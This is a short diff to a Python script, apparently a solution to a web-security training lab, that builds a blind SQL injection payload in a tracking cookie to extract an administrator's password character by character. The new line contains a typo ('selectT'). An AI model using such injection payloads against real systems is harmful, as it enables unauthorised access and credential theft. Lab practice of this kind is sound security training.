@@ -201,9 +201,9 @@ def makeSQLI():
 
             cookies = {
 
-                'TrackingId': "Py8LO6PaRnmBjEv7' AND (SELECT substring(password,{position},1) FROM users where username='administrator')='{character}';",
+                'TrackingId': f"R1pyTZ1RPBPzqwit' and (selectT substring(password,{position},1) from users where username='administrator')='{character}'-- -",
 
-                'session': "6IGqJakJQNeHesyxmDfbJoI7ErU2jIK7"
+                'session': "bO9nmH6cIfC3uHP2ruhTrRlMkF955bLl"
 
              }
 
@@ -211,7 +211,7 @@ def makeSQLI():
 
   
 
-            r = requests.get("https://0a5a004e044b0feb8749a20e005f0068.web-security-academy.net", cookies=cookies)
+            r = requests.get("https://0ac4003e03e89c1280001cb800f50052.web-security-academy.net", cookies=cookies)
 
   
 
